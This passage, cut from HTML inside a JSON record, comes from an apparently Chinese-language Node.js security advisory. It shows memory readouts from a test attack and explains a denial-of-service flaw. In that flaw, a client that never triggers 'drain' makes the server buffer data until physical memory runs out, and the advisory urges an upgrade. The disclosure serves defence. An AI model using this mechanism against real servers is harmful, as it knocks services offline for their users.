class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1250885632</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1211065584</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1189292216</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\">\n</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">{</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> rss</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1250893824</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapTotal</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1211065584</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> heapUsed</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">1189301864</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">}</span></code></pre><p style=\"margin: 1em 0px; font-size: 15px; word-break: break-word; white-space: pre-wrap; word-wrap: break-word; line-height: 1.7em; overflow: auto; font-family: 'Helvetica Neue', 'Luxi Sans', 'DejaVu Sans', Tahoma, 'Hiragino Sans GB', STHeiti, sans-serif; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);\">从我们启动web服务到攻击结束，我们的web服务器内存占用多了近200倍消耗，我们利用<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">top</code>命令打印出服务器当前剩余内存，发现所剩无几：</p><pre class=\"prettyprint\" style=\"line-height: 22px; white-space: pre-wrap; padding: 0px 15px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 14px; border-top-left-radius: 0px; border-top-right-radius: 0px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px; margin: 20px -10px; word-break: break-all; word-wrap: break-word; border-width: 1px 0px; border-style: none; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(247, 247, 247); background-position: initial initial; background-repeat: initial initial;\"><code style=\"font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: inherit;\"><span class=\"typ\" style=\"color: rgb(102, 0, 102);\">Mem</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">:</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">3925040k</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> total</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">3290428k</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> used</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">634612k</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> free</span><span class=\"pun\" style=\"color: rgb(102, 102, 0);\">,</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> </span><span class=\"lit\" style=\"color: rgb(0, 102, 102);\">170324k</span><span class=\"pln\" style=\"color: rgb(0, 0, 0);\"> buffers</span></code></pre><p style=\"margin: 1em 0px; font-size: 15px; word-break: break-word; white-space: pre-wrap; word-wrap: break-word; line-height: 1.7em; overflow: auto; font-family: 'Helvetica Neue', 'Luxi Sans', 'DejaVu Sans', Tahoma, 'Hiragino Sans GB', STHeiti, sans-serif; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);\">更可怕的是，这部分内存还不会主动释放，除非重启Node.js进程才会，一个<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">tcp</code>连接已经有这么强大的威力，如果再多发送10W次，或者有2个恶意连接同时攻击，我们的Node.js web服务器终将会因为物理内存耗尽进入频繁交换失去响应，无法提供服务了。</p><p style=\"margin: 1em 0px; font-size: 15px; word-break: break-word; white-space: pre-wrap; word-wrap: break-word; line-height: 1.7em; overflow: auto; font-family: 'Helvetica Neue', 'Luxi Sans', 'DejaVu Sans', Tahoma, 'Hiragino Sans GB', STHeiti, sans-serif; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);\">所以此次的http漏洞非常紧急，请各位加紧升级您的Node.js版本。</p><p style=\"margin: 1em 0px; font-size: 15px; word-break: break-word; white-space: pre-wrap; word-wrap: break-word; line-height: 1.7em; overflow: auto; font-family: 'Helvetica Neue', 'Luxi Sans', 'DejaVu Sans', Tahoma, 'Hiragino Sans GB', STHeiti, sans-serif; font-variant-ligatures: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255);\">关于漏洞的原因主要是，由于客户端不触发<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">drain</code>这样的排泄事件，而Node.js服务器却一直在往<code style=\"padding: 4px 6px; font-family: Monaco, Menlo, Consolas, 'Courier New', monospace; font-size: 12px; color: rgb(0, 0, 0); border-top-left-radius: 1px; border-top-right-radius: 1px; border-bottom-right-radius: 1px; border-bottom-left-radius: 1px; white-space: nowrap; border: none; margin-right: 1px; margin-left: 1px; background-color: rgb(252, 250, 250); background-position: 0px 0px; background-repeat: initial initial;\">stream</code>中写入数据，从而造成物理内存一直无法释放，最终耗尽。</p>"
    }
  ]
}